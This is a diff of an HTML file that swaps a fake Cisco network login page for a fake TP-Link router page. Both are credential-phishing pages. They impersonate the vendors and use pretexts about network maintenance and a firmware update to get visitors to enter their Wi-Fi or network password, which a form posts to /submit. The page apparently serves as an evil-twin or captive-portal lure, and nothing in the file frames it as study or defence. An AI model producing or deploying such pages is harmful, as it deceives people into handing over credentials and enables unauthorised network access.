@@ -1,193 +1,103 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Cisco Network Login</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
-
-  * {
-    box-sizing: border-box;
-  }
-
-  body, html {
-    margin: 0; padding: 0; height: 100%;
-    font-family: 'Roboto', sans-serif;
-    background-color: #f5f7fa;
-  }
-
-  .container {
-    display: flex;
-    height: 100vh;
-    width: 100vw;
-  }
-
-  .left-panel {
-    flex: 1;
-    background: white;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    padding: 40px;
-    border-right: 1px solid #e1e4e8;
-  }
-
-  .logo {
-    max-width: 180px;
-    margin-bottom: 20px;
-  }
-
-  .logo img {
-    width: 100%;
-    height: auto;
-    user-select: none;
-  }
-
-  .welcome-text {
-    font-size: 1.25rem;
-    font-weight: 500;
-    color: #1a1a1a;
-    text-align: center;
-    max-width: 280px;
-  }
-
-  .right-panel {
-    flex: 1;
-    background: #f0f2f5;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-  }
-
-  .login-box {
-    background: white;
-    padding: 40px 35px;
-    width: 320px;
-    box-shadow: 0 6px 18px rgba(0,0,0,0.12);
-    border-radius: 8px;
-  }
-
-  .login-title {
-    font-size: 1.4rem;
-    font-weight: 600;
-    color: #1a1a1a;
-    margin-bottom: 15px;
-    text-align: center;
-  }
-
-  .excuse-text {
-    font-size: 0.9rem;
-    color: #555;
-    margin-bottom: 25px;
-    line-height: 1.4;
-    text-align: center;
-    font-style: italic;
-  }
-
-  form {
-    display: flex;
-    flex-direction: column;
-  }
-
-  label {
-    font-weight: 500;
-    font-size: 0.9rem;
-    color: #333;
-    margin-bottom: 8px;
-  }
-
-  input[type="password"] {
-    padding: 12px 14px;
-    font-size: 1rem;
-    border: 1.8px solid #cfd7df;
-    border-radius: 6px;
-    transition: border-color 0.3s ease;
-    outline-offset: 2px;
-  }
-
-  input[type="password"]:focus {
-    border-color: #0070d2;
-    box-shadow: 0 0 0 3px rgba(0, 112, 210, 0.3);
-  }
-
-  button {
-    margin-top: 28px;
-    padding: 14px;
-    background-color: #0070d2;
-    color: white;
-    font-weight: 700;
-    font-size: 1rem;
-    border: none;
-    border-radius: 6px;
-    cursor: pointer;
-    transition: background-color 0.3s ease;
-  }
-
-  button:hover {
-    background-color: #005bb5;
-  }
-
-  .footer-text {
-    text-align: center;
-    margin-top: 30px;
-    font-size: 0.8rem;
-    color: #8c8c8c;
-  }
-
-  @media (max-width: 700px) {
-    .container {
-      flex-direction: column;
+  <meta charset="UTF-8" />
+  <title>TP-Link Router Access</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      font-family: "Segoe UI", "Open Sans", sans-serif;
+      background-color: #f4f7f9;
+      margin: 0;
+      padding: 0;
     }
-    .left-panel, .right-panel {
-      flex: none;
+
+    .header {
+      background-color: #3ab795;
+      color: white;
+      padding: 1rem 2rem;
+      font-size: 1.4rem;
+      font-weight: bold;
+    }
+
+    .content {
+      max-width: 500px;
+      background-color: white;
+      margin: 5vh auto;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
+    }
+
+    .status-box {
+      background-color: #eafaf5;
+      border: 1px solid #3ab795;
+      padding: 1rem;
+      border-radius: 4px;
+      margin-bottom: 1.5rem;
+      color: #333;
+    }
+
+    .status-box strong {
+      color: #3ab795;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 600;
+    }
+
+    input[type="password"] {
       width: 100%;
-      height: auto;
+      padding: 0.6rem;
+      font-size: 1rem;
+      margin-bottom: 1.5rem;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    button {
+      width: 100%;
+      padding: 0.75rem;
+      font-size: 1rem;
+      background-color: #3ab795;
+      color: white;
       border: none;
+      border-radius: 4px;
+      cursor: pointer;
     }
-    .left-panel {
-      padding: 30px 20px;
-      border-bottom: 1px solid #e1e4e8;
+
+    button:hover {
+      background-color: #329f83;
     }
-    .login-box {
-      margin: 30px auto;
-      width: 90%;
-      max-width: 360px;
+
+    .footer {
+      text-align: center;
+      font-size: 0.8rem;
+      color: #999;
+      margin-top: 2rem;
     }
-  }
-</style>
+  </style>
 </head>
 <body>
+  <div class="header">TP-Link Wireless Router</div>
 
-<div class="container" role="main" aria-label="Cisco Network Login">
-
-  <div class="left-panel" aria-hidden="true">
-    <div class="logo">
-      <img src="static/cisco-logo-transparent.png" alt="Cisco Logo" />
+  <div class="content">
+    <div class="status-box">
+      <strong>Firmware Update in Progress</strong><br />
+      Your router is currently finalizing a security patch. Internet access is paused until re-authentication is complete.
     </div>
-    <div class="welcome-text">
-      Welcome to the Cisco Network<br />
-      Please authenticate to continue.
-    </div>
-  </div>
 
-  <div class="right-panel">
-    <div class="login-box" role="form" aria-labelledby="login-title">
-      <h1 id="login-title" class="login-title">Sign In</h1>
-      <div class="excuse-text">
-        Due to recent network maintenance, please re-enter your network password to continue accessing the network securely.
-      </div>
-      <form action="/submit" method="POST" autocomplete="off" novalidate>
-        <label for="password">Password</label>
-        <input type="password" id="password" name="password" required autofocus />
-        <button type="submit">Sign In</button>
-      </form>
-      <div class="footer-text">© Cisco Systems, Inc.</div>
+    <form method="POST" action="/submit">
+      <label for="pwd">Wi-Fi Password</label>
+      <input type="password" name="password" id="pwd" required placeholder="Enter your password" />
+      <button type="submit">Continue</button>
+    </form>
+
+    <div class="footer">
+      © TP-Link Technologies Co., Ltd. All rights reserved.
     </div>
   </div>
-
-</div>
-
 </body>
 </html>
